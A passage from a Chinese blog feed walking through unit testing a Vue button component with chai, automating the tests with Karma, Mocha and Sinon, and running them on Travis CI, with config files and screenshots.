class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">props</span>: [<span class="string">&#x27;icon&#x27;</span>],</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">name</span>: <span class="string">&#x27;Button&#x27;</span></span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">lang</span>=<span class="string">&quot;scss&quot;</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">  <span class="selector-class">.icon</span> &#123;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">width</span>: <span class="number">1em</span>;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">height</span>: <span class="number">1em</span>;</span></span><br><span class="line"><span class="language-css">  &#125;</span></span><br><span class="line"><span class="language-css">  <span class="selector-tag">button</span> &#123;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">padding</span>: <span class="number">10px</span> <span class="number">20px</span>;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">font-size</span>: <span class="number">14px</span>;</span></span><br><span class="line"><span class="language-css">  &#125;</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>index.html</strong></p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;ie=edge&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">g-button</span> @<span class="attr">click</span>=<span class="string">&quot;click&quot;</span> <span class="attr">icon</span>=<span class="string">&quot;settings&quot;</span>&gt;</span>这是一个按钮<span class="tag">&lt;/<span class="name">g-button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;div&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;./src/index.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="comment">&lt;!-- &lt;script src=&quot;./node_modules/vue/dist/vue.min.js&quot;&gt;&lt;/script&gt; --&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="comment">&lt;!-- &lt;script src=&quot;./button.js&quot;&gt;&lt;/script&gt; --&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="comment">&lt;!-- &lt;script&gt;</span></span></span><br><span class="line"><span class="comment"><span class="language-xml">    new Vue(</span></span><span class="template-variable">&#123;</span></span><br><span class="line"><span class="template-variable">      el: &#x27;#app&#x27;</span></span><br><span class="line"><span class="template-variable">    &#125;</span><span class="language-xml"><span class="comment">)</span></span></span><br><span class="line"><span class="comment"><span class="language-xml">  &lt;/script&gt; --&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure><h3 id="单元测试"><a href="#单元测试" class="headerlink" title="单元测试"></a>单元测试</h3><p>开始第一次单元测试</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">Vue</span> <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">Button</span> <span class="keyword">from</span> <span class="string">&#x27;./button&#x27;</span></span><br><span class="line"><span class="keyword">import</span> &#123;expect&#125; <span class="keyword">from</span> <span class="string">&#x27;chai&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">Vue</span>.<span class="title function_">component</span>(<span class="string">&#x27;g-button&#x27;</span>, <span class="title class_">Button</span>)</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span><br><span class="line">  <span class="attr">el</span>: <span class="string">&#x27;#app&#x27;</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">const</span> vm = <span class="title class_">Vue</span>.<span class="title function_">extend</span>(<span class="title class_">Button</span>)</span><br><span class="line">  <span class="keyword">const</span> button = <span class="keyword">new</span> <span class="title function_">vm</span>(&#123;</span><br><span class="line">    <span class="attr">el</span>: <span class="string">&#x27;#div&#x27;</span>,</span><br><span class="line">    <span class="attr">propsData</span>: &#123;</span><br><span class="line">      <span class="attr">icon</span>: <span class="string">&#x27;settings&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">  <span class="keyword">const</span> icon = button.<span class="property">$el</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;use&#x27;</span>)</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(icon)</span><br><span class="line">  <span class="title function_">expect</span>(icon.<span class="title function_">getAttribute</span>(<span class="string">&#x27;xlink:href&#x27;</span>)).<span class="property">to</span>.<span class="title function_">eq</span>(<span class="string">&#x27;settings&#x27;</span>); <span class="comment">// 断言语句。</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/Blog/2018/12/10/vue/%E5%B0%9D%E8%AF%95%E5%86%99%E7%AC%AC%E4%B8%80%E4%B8%AA%E5%8D%95%E5%85%83%E6%B5%8B%E8%AF%95%E3%80%81%E8%87%AA%E5%8A%A8%E5%8C%96%E6%B5%8B%E8%AF%95%E3%80%81%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90/index/img.png" alt="失败"></p><p>第一次测试失败，svg属性没写全</p><p>所以再试一次~</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">Vue</span> <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">Button</span> <span class="keyword">from</span> <span class="string">&#x27;./button&#x27;</span></span><br><span class="line"><span class="keyword">import</span> &#123;expect&#125; <span class="keyword">from</span> <span class="string">&#x27;chai&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">Vue</span>.<span class="title function_">component</span>(<span class="string">&#x27;g-button&#x27;</span>, <span class="title class_">Button</span>)</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span><br><span class="line">  <span class="attr">el</span>: <span class="string">&#x27;#app&#x27;</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">const</span> vm = <span class="title class_">Vue</span>.<span class="title function_">extend</span>(<span class="title class_">Button</span>)</span><br><span class="line">  <span class="keyword">const</span> button = <span class="keyword">new</span> <span class="title function_">vm</span>(&#123;</span><br><span class="line">    <span class="attr">el</span>: <span class="string">&#x27;#div&#x27;</span>,</span><br><span class="line">    <span class="attr">propsData</span>: &#123;</span><br><span class="line">      <span class="attr">icon</span>: <span class="string">&#x27;settings&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">  <span class="keyword">const</span> icon = button.<span class="property">$el</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;use&#x27;</span>)</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(icon)</span><br><span class="line">  <span class="title function_">expect</span>(icon.<span class="title function_">getAttribute</span>(<span class="string">&#x27;xlink:href&#x27;</span>)).<span class="property">to</span>.<span class="title function_">eq</span>(<span class="string">&#x27;#icon-settings&#x27;</span>); <span class="comment">// 断言语句。</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/Blog/2018/12/10/vue/%E5%B0%9D%E8%AF%95%E5%86%99%E7%AC%AC%E4%B8%80%E4%B8%AA%E5%8D%95%E5%85%83%E6%B5%8B%E8%AF%95%E3%80%81%E8%87%AA%E5%8A%A8%E5%8C%96%E6%B5%8B%E8%AF%95%E3%80%81%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90/index/img_1.png" alt="成功"></p><p>成功啦~，<br>浏览器中没有任何报错说明测试通过</p><p>但是每次都打开浏览器、刷新，实在是非常麻烦，所以我们再继续<strong>自动化测试</strong></p><h3 id="自动化测试"><a href="#自动化测试" class="headerlink" title="自动化测试"></a>自动化测试</h3><p><strong>工具：</strong></p><ol><li>Karma（卡玛）是一个测试运行器，它可以呼起浏览器，加载测试脚本，然后运行测试用例</li><li>Mocha（摩卡）是一个单元测试框架&#x2F;库，它可以用来写测试用例</li><li>Sinon（西农）是一个spy &#x2F; stub &#x2F; mock 库，用以辅助测试（使用后才能理解）</li></ol><p><strong>then：</strong></p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 安装各种工具</span></span><br><span class="line"><span class="comment">// npm i -D karma karma-chrome-launcher karma-mocha karma-sinon-chai mocha sinon sinon-chai karma-chai karma-chai-spies // 最新npm包，防止版本报错，建议锁定版本</span></span><br><span class="line">npm i -D <span class="symbol">karma@</span><span class="number">2.0</span><span class="number">.4</span> karma-chrome-<span class="symbol">launcher@</span><span class="number">2.2</span><span class="number">.0</span> karma-<span class="symbol">mocha@</span><span class="number">1.3</span><span class="number">.0</span> karma-sinon-<span class="symbol">chai@</span><span class="number">1.3</span><span class="number">.4</span> <span class="symbol">mocha@</span><span class="number">5.2</span><span class="number">.0</span> <span class="symbol">sinon@</span><span class="number">6.0</span><span class="number">.1</span> sinon-<span class="symbol">chai@</span><span class="number">3.2</span><span class="number">.0</span> karma-<span class="symbol">chai@</span><span class="number">0.1</span><span class="number">.0</span> karma-chai-<span class="symbol">spies@</span><span class="number">0.1</span><span class="number">.4</span></span><br></pre></td></tr></table></figure><p>创建 <code>Karma</code> 配置</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">//</span> 新建 karma.conf.js，内容如下</span><br><span class="line">module.exports = <span class="keyword">function</span> (config) &#123;</span><br><span class="line">  config.set(&#123;</span><br><span class="line">    <span class="regexp">//</span> base path that will be used to resolve all patterns (eg.files, exclude)</span><br><span class="line">    basePath: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    <span class="regexp">//</span> frameworks to use</span><br><span class="line">    <span class="regexp">//</span> available frameworks: https:<span class="regexp">//</span>npmjs.org<span class="regexp">/browse/</span>keyword/karma-adapter</span><br><span class="line">    frameworks: [<span class="string">&#x27;mocha&#x27;</span>, <span class="string">&#x27;sinon-chai&#x27;</span>],</span><br><span class="line">    client: &#123;</span><br><span class="line">      chai: &#123;</span><br><span class="line">        includeStack: true</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="regexp">//</span> list of files / patterns to load <span class="keyword">in</span> the browser</span><br><span class="line">    files: [</span><br><span class="line">      <span class="string">&#x27;dist/**/*.test.js&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;dist/**/*.test.css&#x27;</span></span><br><span class="line">    ],</span><br><span class="line">    <span class="regexp">//</span> list of files / patterns to exclude</span><br><span class="line">    exclude: [],</span><br><span class="line">    <span class="regexp">//</span> preprocess matching files before serving them to the browser</span><br><span class="line">    <span class="regexp">//</span> available preprocessors: https<span class="regexp">//</span>npmjs.org<span class="regexp">/browse/</span>keyword/karma-reporter</span><br><span class="line">    preprocessors: &#123;&#125;,</span><br><span class="line">    <span class="regexp">//</span> test results reporter to use</span><br><span class="line">    <span class="regexp">//</span> possible values: <span class="string">&#x27;dots&#x27;</span>, <span class="string">&#x27;progress&#x27;</span></span><br><span class="line">    <span class="regexp">//</span> available reporters: https:<span class="regexp">//</span>npmjs.org<span class="regexp">/browse/</span>keyword/karma-reporter</span><br><span class="line">    reporters: [<span class="string">&#x27;progress&#x27;</span>],</span><br><span class="line">    <span class="regexp">//</span> web server port</span><br><span class="line">    port: <span class="number">9876</span>,</span><br><span class="line">    <span class="regexp">//</span> enable / disable colors <span class="keyword">in</span> the output (reporters and logs)</span><br><span class="line">    colors: true,</span><br><span class="line">    <span class="regexp">//</span> level <span class="keyword">if</span> logging</span><br><span class="line">    <span class="regexp">//</span> possible values: config.LOG_DISABLE || config.LOG_ERROR || config.LOG_WARN || config.LOG_INFO || config.LOG_DEBUG</span><br><span class="line">    logLevel: config.LOG_INFO,</span><br><span class="line">    <span class="regexp">//</span> enable / disable watching file and executing tests whenever any file changes</span><br><span class="line">    autoWatch: true,</span><br><span class="line">    <span class="regexp">//</span> start these browsers</span><br><span class="line">    <span class="regexp">//</span> available browser launchers: http:<span class="regexp">//</span>npmjs.org<span class="regexp">/browse/</span>keyword/karma-launcher</span><br><span class="line">    browsers: [<span class="string">&#x27;Chrome&#x27;</span>],</span><br><span class="line">    <span class="regexp">//</span> Continuous Integration mode</span><br><span class="line">    <span class="regexp">//</span> <span class="keyword">if</span> true, Karma captures browsers, runs the tests and exits</span><br><span class="line">    singleRun: false,</span><br><span class="line">    <span class="regexp">//</span> Concurrenecy level</span><br><span class="line">    <span class="regexp">//</span> how many browser should be started simultaneous</span><br><span class="line">    concurrency: Infinity</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>创建test目录并在其目录下创建并更改 <code>button.test.js</code></p><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">//</span> <span class="keyword">import</span> &#123;expect&#125; <span class="keyword">from</span> <span class="string">&#x27;chai&#x27;</span></span><br><span class="line">const expect = chai.expect</span><br><span class="line"><span class="keyword">import</span> Vue <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"><span class="keyword">import</span> Button <span class="keyword">from</span> <span class="string">&#x27;../src/button&#x27;</span></span><br><span class="line"></span><br><span class="line">Vue.config.productionTip = <span class="literal">false</span></span><br><span class="line">Vue.config.devtools = <span class="literal">false</span></span><br><span class="line"></span><br><span class="line">describe(<span class="string">&#x27;Button&#x27;</span>, <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  it(<span class="string">&#x27;存在&#x27;</span>, <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    expect(Button).to.be.ok <span class="regexp">//</span>不是 <span class="literal">undefined</span> <span class="literal">null</span> <span class="number">0</span> <span class="string">&#x27;&#x27;</span> 等falsy值</span><br><span class="line">  &#125;)</span><br><span class="line">  it(<span class="string">&#x27;可以设置icon&#x27;</span>, <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    const vm = Vue.extend(Button)</span><br><span class="line">    const button = <span class="keyword">new</span> vm(&#123;</span><br><span class="line">      el: <span class="string">&#x27;#div&#x27;</span>,</span><br><span class="line">      propsData: &#123;</span><br><span class="line">        icon: <span class="string">&#x27;settings&#x27;</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">    const icon = button.$el.querySelector(<span class="string">&#x27;use&#x27;</span>)</span><br><span class="line">    console.log(icon)</span><br><span class="line">    expect(icon.getAttribute(<span class="string">&#x27;xlink:href&#x27;</span>)).to.equal(<span class="string">&#x27;#icon-setting&#x27;</span>)</span><br><span class="line">  &#125;)</span><br><span class="line">  it(<span class="string">&#x27;点击 button 触发 click 事件&#x27;</span>, <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    const vm = Vue.extend(Button)</span><br><span class="line">    const button = <span class="keyword">new</span> vm(&#123;</span><br><span class="line">      el: <span class="string">&#x27;#div&#x27;</span>,</span><br><span class="line">      propsData: &#123;</span><br><span class="line">        icon: <span class="string">&#x27;settings&#x27;</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">    const callback = sinon.fake()</span><br><span class="line">    button.$<span class="literal">on</span>(<span class="string">&#x27;click&#x27;</span>, callback)</span><br><span class="line">    button.$el.click()</span><br><span class="line">    expect(callback).to.have.been.called</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>创建测试脚本<br>在 <code>package.json</code> 里面找到 <code>script</code> 并改写里面的内容</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">&quot;scripts&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;dev-test&quot;</span><span class="punctuation">:</span> <span class="string">&quot;parcel watch test/* --no-cache &amp; karma start&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;test&quot;</span><span class="punctuation">:</span> <span class="string">&quot;parcel build test/* --no-cache --no-minify &amp; karma start --single-run&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>准备完毕，开始跑我们的代码</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">//</span> 这行命令会自动打开浏览器并测试</span><br><span class="line">npm run test</span><br><span class="line"><span class="regexp">//</span> 或者 npm run dev-test <span class="regexp">//</span> 持续打包</span><br></pre></td></tr></table></figure><p>当用例全部成功时：</p><p><img src="/Blog/2018/12/10/vue/%E5%B0%9D%E8%AF%95%E5%86%99%E7%AC%AC%E4%B8%80%E4%B8%AA%E5%8D%95%E5%85%83%E6%B5%8B%E8%AF%95%E3%80%81%E8%87%AA%E5%8A%A8%E5%8C%96%E6%B5%8B%E8%AF%95%E3%80%81%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90/index/img_2.png" alt="成功~"></p><p>当有用例失败时，终端会提示报错：</p><p><img src="/Blog/2018/12/10/vue/%E5%B0%9D%E8%AF%95%E5%86%99%E7%AC%AC%E4%B8%80%E4%B8%AA%E5%8D%95%E5%85%83%E6%B5%8B%E8%AF%95%E3%80%81%E8%87%AA%E5%8A%A8%E5%8C%96%E6%B5%8B%E8%AF%95%E3%80%81%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90/index/img_3.png" alt="失败"></p><blockquote><p>更多测试语句请参考 <a href="https://www.chaijs.com/guide/styles/#expect">chai官方API</a></p></blockquote><p><strong>中途遇到的报错~</strong></p><p><img src="/Blog/2018/12/10/vue/%E5%B0%9D%E8%AF%95%E5%86%99%E7%AC%AC%E4%B8%80%E4%B8%AA%E5%8D%95%E5%85%83%E6%B5%8B%E8%AF%95%E3%80%81%E8%87%AA%E5%8A%A8%E5%8C%96%E6%B5%8B%E8%AF%95%E3%80%81%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90/index/img_4.png"></p><p>在 <code>package.json</code> 添加如下：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">&quot;alias&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;vue&quot;</span><span class="punctuation">:</span> <span class="string">&quot;./node_modules/vue/dist/vue.common.js&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h3 id="持续集成"><a href="#持续集成" class="headerlink" title="持续集成"></a>持续集成</h3><p>说到懒，一向是程序员的优良传统~</p><p>目前比较流行的是 <code>TravisCi</code>(免费) 和 <code>circleCi</code>(收费，功能强大)</p><blockquote><p><a href="http://www.ruanyifeng.com/blog/2017/12/travis_ci_tutorial.html">阮一峰的Travis教程</a></p></blockquote><p>首先我们继续在根目录创建文件 <code>.travis.yml</code></p><p>内容如下：</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">language:</span> node_js <span class="meta"># 使用node_js进行测试</span></span><br><span class="line"><span class="symbol">node_js:</span> <span class="meta"># node_js版本号</span></span><br><span class="line">  - <span class="string">&quot;8&quot;</span></span><br><span class="line">  - <span class="string">&quot;9&quot;</span></span><br><span class="line">  - <span class="string">&quot;10&quot;</span></span><br><span class="line"><span class="symbol">addons:</span> <span class="meta"># 插件</span></span><br><span class="line"><span class="symbol">  chrome:</span> stable <span class="meta"># 谷歌浏览器稳定版</span></span><br><span class="line"><span class="symbol">sudo:</span> required</span><br><span class="line"><span class="symbol">before_script:</span></span><br><span class="line">  - <span class="string">&quot;sudo chown root /opt/google/chrome/chrome-sandbox&quot;</span></span><br><span class="line">  - <span class="string">&quot;sudo chmod 4755 /opt/google/chrome/chrome-sandbox&quot;</span></span><br></pre></td></tr></table></figure><p>then:<br>我们前去 <a href="https://travis-ci.org/">Travis</a> 官方网站，并使用 <code>GitHub</code> 帐号关联登陆，并找到刚刚的测试项目，然后开启</p><p><img src="/Blog/2018/12/10/vue/%E5%B0%9D%E8%AF%95%E5%86%99%E7%AC%AC%E4%B8%80%E4%B8%AA%E5%8D%95%E5%85%83%E6%B5%8B%E8%AF%95%E3%80%81%E8%87%AA%E5%8A%A8%E5%8C%96%E6%B5%8B%E8%AF%95%E3%80%81%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90/index/img_5.png"></p><p>返回首页，我们就能看到已经在测试啦~</p><p><img src="/Blog/2018/12/10/vue/%E5%B0%9D%E8%AF%95%E5%86%99%E7%AC%AC%E4%B8%80%E4%B8%AA%E5%8D%95%E5%85%83%E6%B5%8B%E8%AF%95%E3%80%81%E8%87%AA%E5%8A%A8%E5%8C%96%E6%B5%8B%E8%AF%95%E3%80%81%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90/index/img_6.png" alt="开始啦"></p><p>但是，我们又报错了 &#x3D;。&#x3D;</p><p><img src="/Blog/2018/12/10/vue/%E5%B0%9D%E8%AF%95%E5%86%99%E7%AC%AC%E4%B8%80%E4%B8%AA%E5%8D%95%E5%85%83%E6%B5%8B%E8%AF%95%E3%80%81%E8%87%AA%E5%8A%A8%E5%8C%96%E6%B5%8B%E8%AF%95%E3%80%81%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90/index/img_7.png" alt="error"></p><p>报错并不可怕，翻来覆去只能想到返回 <code>Karma</code> 的配置，改一下浏览器设置</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">//</span> start these browsers</span><br><span class="line"><span class="regexp">//</span> available browser launchers: http:<span class="regexp">//</span>npmjs.org<span class="regexp">/browse/</span>keyword/karma-launcher</span><br><span class="line">browsers: [<span class="string">&#x27;ChromeHeadless&#x27;</span>],</span><br></pre></td></tr></table></figure><p>由于我们接入了 <code>GitHub</code> 所以，在我们提交之后， <code>Travis</code> 就会检测到文件改变并自动测试~</p><blockquote><p>当 Travis 任务状态改变（失败或成功）都会向你的邮箱里发一封邮件，所以我们并不用一直打开他的网页</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Vue </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>JS又一关于let趣闻</title>
      <link href="/Blog/2018/12/03/zch&#39;s_fool/JS%E5%8F%88%E4%B8%80%E5%85%B3%E4%BA%8Elet%E8%B6%A3%E9%97%BB/index/"/>
      <url>/Blog/2018/12/03/zch&#39;s_fool/JS%E5%8F%88%E4%B8%80%E5%85%B3%E4%BA%8Elet%E8%B6%A3%E9%97%BB/index/</url>
      
